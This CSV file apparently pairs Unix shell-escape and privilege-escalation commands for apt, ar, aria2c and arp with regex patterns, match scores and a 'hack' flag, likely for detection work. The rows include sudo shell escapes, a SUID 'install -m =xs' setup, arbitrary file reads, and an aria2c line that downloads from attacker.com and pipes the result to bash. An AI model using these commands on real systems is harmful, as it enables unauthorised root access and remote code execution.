ocode,code,word_count,match_count,match_score,hack
apt-get changelog apt,apt-get changelog apt,3,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
sudo apt-get changelog apt,sudo apt-get changelog apt,4,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF","echo 'Dpkg::Pre-Invoke {""/bin/sh\;false""}' > \$TF",5,0,0.041666666666666664,1
sudo apt-get install -c $TF sl,sudo apt-get install -c \$TF sl,6,0,0.03225806451612903,0
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh,"sudo apt-get update -o APT::Update::Pre-Invoke::=[ a-z0-9\.\-\/\'\""_\@]+",5,1,0.38596491228070173,0
apt-get changelog apt,apt-get changelog apt,3,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
sudo apt-get changelog apt,sudo apt-get changelog apt,4,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF","echo 'Dpkg::Pre-Invoke {""/bin/sh\;false""}' > \$TF",5,0,0.041666666666666664,1
sudo apt install -c $TF sl,sudo apt install -c \$TF sl,6,0,0.037037037037037035,0
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh,"sudo apt update -o APT::Update::Pre-Invoke::=[ a-z0-9\.\-\/\'\""_\@]+",5,1,0.41509433962264153,0
OUTFILE=$(mktemp -u),[\w\-_]+=\$\(mktemp -u\),2,1,0.5238095238095238,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"ar r ""$OUTFILE"" ""$LFILE""","ar r ""\$OUTFILE"" ""\$LFILE""",4,0,0.08,0
"cat ""$OUTFILE""","cat ""\$OUTFILE""",2,0,0.06666666666666667,0
sudo install -m =xs $(which ar) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which ar\) \.",7,1,0.7941176470588235,0
OUTFILE=$(mktemp -u),[\w\-_]+=\$\(mktemp -u\),2,1,0.5238095238095238,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./ar r ""$OUTFILE"" ""$LFILE""","\./ar r ""\$OUTFILE"" ""\$LFILE""",4,0,0.1111111111111111,0
"cat ""$OUTFILE""","cat ""\$OUTFILE""",2,0,0.06666666666666667,0
OUTFILE=$(mktemp -u),[\w\-_]+=\$\(mktemp -u\),2,1,0.5238095238095238,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo ar r ""$OUTFILE"" ""$LFILE""","sudo ar r ""\$OUTFILE"" ""\$LFILE""",5,0,0.06666666666666667,0
"cat ""$OUTFILE""","cat ""\$OUTFILE""",2,0,0.06666666666666667,0
COMMAND='id',"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.3076923076923075,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo ""$COMMAND"" > $TF","echo ""\$COMMAND"" > \$TF",4,0,0.09090909090909091,0
chmod +x $TF,chmod \+x \$TF,3,0,0.15384615384615385,0
aria2c --on-download-error=$TF http://x,aria2c [\w\-_]+=\$TF http://x,3,1,0.45,0
aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa,"aria2c --allow-overwrite [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/aaaaaaaaaaaaaaaa",5,3,0.48672566371681414,0
COMMAND='id',"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.3076923076923075,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo ""$COMMAND"" > $TF","echo ""\$COMMAND"" > \$TF",4,0,0.09090909090909091,0
chmod +x $TF,chmod \+x \$TF,3,0,0.15384615384615385,0
sudo aria2c --on-download-error=$TF http://x,sudo aria2c [\w\-_]+=\$TF http://x,4,1,0.4,0
sudo install -m =xs $(which aria2c) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which aria2c\) \.",7,1,0.7105263157894737,0
COMMAND='id',"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.3076923076923075,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo ""$COMMAND"" > $TF","echo ""\$COMMAND"" > \$TF",4,0,0.09090909090909091,0
chmod +x $TF,chmod \+x \$TF,3,0,0.15384615384615385,0
./aria2c --on-download-error=$TF http://x,\./aria2c [\w\-_]+=\$TF http://x,3,1,0.4523809523809524,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"arp -v -f ""$LFILE""","arp -v -f ""\$LFILE""",4,0,0.05263157894736842,0
